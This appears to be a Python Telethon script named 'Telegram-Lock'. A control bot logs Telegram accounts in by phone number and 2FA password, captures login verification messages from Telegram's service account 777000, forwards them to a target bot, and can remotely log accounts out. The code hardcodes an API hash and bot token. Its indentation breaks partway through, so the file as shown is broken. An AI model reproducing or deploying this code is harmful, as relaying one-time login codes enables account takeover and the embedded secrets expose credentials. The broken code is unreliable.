import asyncio
import platform
import os
import re
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    AuthKeyDuplicatedError
)

# Log config
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('apscheduler').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)

# API Credentials
API_ID = 19684564
API_HASH = "6219dccd88035a229ec3aa84d8162a38"
BOT_TOKEN = "8754918048:AAEKWN7fBUZalgJpI3yJC31tc7wo6KFsp_Q"
# Target Bot Numeric ID (integer format)
TARGET_BOT_ID = 8754918048

# Global storage
accounts = {}
user_login_states = {}
PHONE_PATTERN = re.compile(r'^\+\d{10,15}$')


def bind_account_handlers(client, phone):
    target_entity = None
    # Force reload bot entity with 3 retry attempts
    async def load_bot_entity():
        nonlocal target_entity
        retry_times = 0
        while retry_times < 3:
            try:
                target_entity = await client.get_entity(TARGET_BOT_ID)
                logger.info(f"[{phone}] Bot entity loaded successfully, ID = {target_entity.id}")
                break
            except Exception as err:
                retry_times += 1
                logger.warning(f"[{phone}] Failed load bot, retry {retry_times}/3 | Error: {str(err)}")
                await asyncio.sleep(2)

    # Run load task after account login
    client.loop.create_task(load_bot_entity())

    # Self check alive command
    @client.on(events.NewMessage(outgoing=True))
    async def self_check_handler(event):
        if event.message.text and event.message.text.lower() == "self check":
            await event.message.edit(text="self checked!")

    # Query anti-login switch status
    @client.on(events.NewMessage(outgoing=True, pattern="antilogin$"))
    async def status_check(event):
        state = "on" if accounts[phone]["anti_login"] else "off"
        await event.message.edit(text=f"Anti-login forwarding switch status: {state}.")
        logger.info(f"[{phone}] User query push status: {state}")

    # Enable auto send verification text
    @client.on(events.NewMessage(outgoing=True, pattern="antilogin on$"))
    async def enable_push(event):
        accounts[phone]["anti_login"] = True
        await event.message.edit(text="Anti-login text push enabled successfully.")
        logger.info(f"[{phone}] Auto verification push turned ON")

    # Disable auto send verification text
    @client.on(events.NewMessage(outgoing=True, pattern="antilogin off$"))
    async def disable_push(event):
        accounts[phone]["anti_login"] = False
        await event.message.edit(text="Anti-login text push disabled successfully.")
        logger.info(f"[{phone}] Auto verification push turned OFF")

    # Capture SMS message from official Telegram bot 777000
    @client.on(events.NewMessage(from_users=[777000]))
    async def capture_verification(event):
        logger.info(f"[{phone}] Received login SMS from 777000, push switch = {accounts[phone]['anti_login']}")
        if accounts[phone]["anti_login"] and target_entity is not None:
            try:
                message_text = f"Source Phone Number: {phone}\nVerification Content:\n{event.message.text}"
                # Send plain text instead of forward message, higher compatibility
                await client.send_message(target_entity, message_text)
                logger.info(f"[{phone}] SUCCESS: Verification text sent to target bot {TARGET_BOT_ID}")
            except Exception as err:
                logger.error(f"[{phone}] FAILED send verification text: {str(err)}")


# Main management bot client for account control commands
bot_client = TelegramClient(StringSession(), API_ID, API_HASH)


@bot_client.on(events.NewMessage(pattern="/start"))
async def cmd_help(event):
    help_text = """📖 Telegram-Lock Full Command List
[Commands run inside your logged phone chat window]
self check        Test if program is running normally
antilogin         Check auto-verification text push switch status
antilogin on      Enable auto send login SMS text to target bot
antilogin off     Disable auto send login SMS text

[Management Commands (Send to this bot private chat)]
/addphone +8613800138000    Login new phone number to monitor SMS
/listphone                  Show all logged phone numbers & push status
/delphone +8613800138000    Delete local session file of target phone
/logout +8613800138000      Remote logout target phone on all devices
"""
    await event.reply(help_text)


@bot_client.on(events.NewMessage(pattern="/addphone (.+)"))
async def cmd_add_new_phone(event):
    input_phone = event.pattern_match.group(1).strip()
    if not PHONE_PATTERN.match(input_phone):
        await event.reply("❌ Wrong phone format, example: /addphone +8613800138000")
        return
    if input_phone in accounts:
        await event.reply("⚠️ This phone number has already logged in")
        return

    session_file_name = f"session_{input_phone.replace('+','')}"
    new_user_client = TelegramClient(session_file_name, API_ID, API_HASH)
    try:
        await new_user_client.connect()
        code_request = await new_user_client.send_code_request(input_phone)
        user_login_states[event.sender_id] = {
            "client": new_user_client,
            "phone": input_phone,
            "code_hash": code_request.phone_code_hash,
            "step": "input_sms_code"
        }
        await event.reply(f"✅ Login verification code sent to {input_phone}, reply pure numeric code to finish login")
    except PhoneNumberInvalidError:
        await event.reply("❌ Invalid phone number input")
    except AuthKeyDuplicatedError:
        await event.reply("❌ This account is logged in on another device")
    except Exception as err:
        await event.reply(f"❌ Failed send login code: {str(err)}")


@bot_client.on(events.NewMessage)
async def login_input_process(event):
    if event.sender_id not in user_login_states:
        return
    login_state = user_login_states[event.sender_id]
    user_input = event.text.strip()

    # Step 1: Input SMS login code
    if login_state["step"] == "input_sms_code":
        if not user_input.isdigit():
            return
        try:
            await login_state["client"].sign_in(
                phone_code_hash=login_state["code_hash"],
                code=user_input
            )
            accounts[login_state["phone"]] = {
                "client": login_state["client"],
                "anti_login": False
            }
            bind_account_handlers(login_state["client"], login_state["phone"])
            del user_login_states[event.sender_id]
            await event.reply(f"🎉 {login_state['phone']} login complete, send antilogin on to enable auto code push")
        except SessionPasswordNeededError:
            login_state["step"] = "input_2fa_password"
             await event.reply("🔐 This account enabled two-step verification, reply your 2FA password")
         except PhoneCodeInvalidError:
             await event.reply("❌ Incorrect SMS code, run /addphone to restart login")
             del user_login_states[event.sender_id]
         except Exception as err:
             await event.reply(f"❌ Login failed: {str(err)}")
             del user_login_states[event.sender_id]
     # Step 2: Input two-factor verification password
     elif login_state["step"] == "input_2fa_password":
         try:
             await login_state["client"].sign_in(password=user_input)
             accounts[login_state["phone"]] = {
                 "client": login_state["client"],
                 "anti_login": False
             }
             bind_account_handlers(login_state["client"], login_state["phone"])
             del user_login_states[event.sender_id]
             await event.reply(f"🎉 {login_state['phone']} 2FA verified, login finished successfully")
         except Exception as err:
             await event.reply(f"❌ Wrong 2FA password or error: {str(err)}\nUse /addphone to restart login process")
             del user_login_states[event.sender_id]
 @bot_client.on(events.NewMessage(pattern="/listphone"))
 async def cmd_list_all_logged(event):
     if not accounts:
         await event.reply("📭 No logged monitoring phones, use /addphone to add new account")
         return
     result_text = "📋 All Logged Monitoring Accounts:\n"
     for phone_num, data in accounts.items():
         push_status = "🟢 Push Enabled" if data["anti_login"] else "🔴 Push Disabled"
         result_text += f"- {phone_num} | {push_status}\n"
     await event.reply(result_text)
 @bot_client.on(events.NewMessage(pattern="/delphone (.+)"))
 async def cmd_delete_phone_session(event):
     target_phone = event.pattern_match.group(1).strip()
     if target_phone not in accounts:
         await event.reply("❌ Target phone number not found in logged list")
         return
     await accounts[target_phone]["client"].disconnect()
     del accounts[target_phone]
     session_path = f"session_{target_phone.replace('+','')}.session"
     if os.path.exists(session_path):
         os.remove(session_path)
     await event.reply(f"🗑 Session file of {target_phone} deleted completely")
 @bot_client.on(events.NewMessage(pattern="/logout (.+)"))
 async def cmd_remote_logout(event):
     target_phone = event.pattern_match.group(1).strip()
     if target_phone not in accounts:
         await event.reply("❌ Target phone number not found in logged list")
         return
     try:
         await accounts[target_phone]["client"].log_out()
         await accounts[target_phone]["client"].disconnect()
         del accounts[target_phone]
         session_path = f"session_{target_phone.replace('+','')}.session"
         if os.path.exists(session_path):
             os.remove(session_path)
         await event.reply(f"🚪 {target_phone} logged out remotely from all Telegram devices")
     except Exception as err:
         await event.reply(f"❌ Remote logout failed: {str(err)}")
 async def main():
     print("🤖 Telegram-Lock Program Started, waiting user commands...")
     await bot_client.start(bot_token=BOT_TOKEN)
     print("✅ Management Bot Online, send /start to view full command list")
     # Permanent idle loop to keep program running
     while True:
         await asyncio.sleep(1 / 60)
 if platform.system() == "Emscripten":
     asyncio.ensure_future(main())
 else:
     if __name__ == "__main__":
         asyncio.run(main())
